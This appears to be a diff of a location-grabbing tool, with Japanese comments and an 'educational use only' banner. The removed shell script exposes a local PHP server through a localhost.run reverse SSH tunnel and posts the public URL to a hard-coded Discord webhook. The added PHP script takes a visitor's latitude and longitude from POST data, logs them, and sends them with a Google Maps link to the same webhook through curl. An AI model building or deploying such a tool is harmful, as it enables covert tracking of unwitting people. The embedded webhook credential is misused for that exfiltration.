@@ -1,32 +1,41 @@
-#!/bin/sh
+<?php
+function dbg($msg) {
+    file_put_contents("dbg.txt", date("Y-m-d H:i:s") . " " . $msg . PHP_EOL, FILE_APPEND);
+}
 
-clear
+// POSTデータ受信ログ
+dbg("アクセス: " . json_encode($_POST, JSON_UNESCAPED_UNICODE));
+file_put_contents("debug.log", date("Y-m-d H:i:s") . " - POST: " . json_encode($_POST, JSON_UNESCAPED_UNICODE) . PHP_EOL, FILE_APPEND);
 
-echo "╔══════════════════════════════════════╗"
-echo "║ 🌸 開発者: Devcode                  ║"
-echo "║ ⚠️  本ツールは教育目的でのみ使用可能    ║"
-echo "╚══════════════════════════════════════╝"
+// データチェック
+if (!isset($_POST["lat"]) || !isset($_POST["lng"])) {
+    dbg("💥 Error: POSTデータが不足（lat/lng未送信）");
+    file_put_contents("debug.log", "💥 Error: POSTデータが不足してるよ〜💦" . PHP_EOL, FILE_APPEND);
+    exit("💥 Error: 緯度か経度がPOSTされてないよ〜💦");
+}
 
-echo "📦 パッケージをインストール中です..."
-apk update > dbg.txt 2>&1
-apk add php php-cli curl openssh grep >> dbg.txt 2>&1
+$lat = escapeshellarg($_POST["lat"]);
+$lng = escapeshellarg($_POST["lng"]);
 
-echo "🚀 PHPサーバーを起動中（ポート: 8080）..."
-php -S localhost:8080 >> dbg.txt 2>&1 &
-php_pid=$!
-sleep 2
+$mapsUrl = "https://www.google.com/maps?q=" . trim($lat, "'") . "," . trim($lng, "'");
+$locationMessage = "📍 Location: Latitude = " . trim($lat, "'") . ", Longitude = " . trim($lng, "'");
+$mapsUrlMessage = "🗺 Google Maps URL: " . $mapsUrl;
 
-echo "🌐 トンネル起動中（localhost.run）..."
-yes yes | ssh -o StrictHostKeyChecking=accept-new -R 80:localhost:8080 nokey@localhost.run >> dbg.txt 2>&1 &
-ssh_pid=$!
-sleep 5
+// Discord通知
+$webhookUrl = 'https://discordapp.com/api/webhooks/1356867692899860557/anLF-C2F9gOlPyjCgnJm5B1F5yWARixCnRYA6cXmCOXyVvLvOY2WQOjN03QOp5TQzT3x';
 
-url=$(grep -o 'https://[^ ]*\.lhr\.life' .log | head -n 1)
-echo "✨ 発行URL: $url"
+function sendToDiscord($message, $webhookUrl) {
+    dbg("Discord送信準備: $message");
+    $json = json_encode(["content" => $message], JSON_UNESCAPED_UNICODE);
+    $cmd = "curl -H 'Content-Type: application/json' -X POST -d " . escapeshellarg($json) . " " . escapeshellarg($webhookUrl) . " > /dev/null 2>&1";
+    dbg("curlコマンド: $cmd");
+    system($cmd, $retval);
+    dbg("curl結果: $retval");
+}
 
-webhook_url="https://discordapp.com/api/webhooks/1356867692899860557/anLF-C2F9gOlPyjCgnJm5B1F5yWARixCnRYA6cXmCOXyVvLvOY2WQOjN03QOp5TQzT3x"
-json="{\"content\": \"🔔 URLが発行されました\n$url\"}"
-curl -H "Content-Type: application/json" -X POST -d "$json" "$webhook_url" >> dbg.txt 2>&1
+sendToDiscord($locationMessage, $webhookUrl);
+sendToDiscord($mapsUrlMessage, $webhookUrl);
 
-trap 'echo "🛑 停止中..."; kill $php_pid $ssh_pid; exit 0' INT
-wait
+dbg("🎉 Location送信完了");
+echo "🎉 Location送信完了〜っ！\n";
+?>
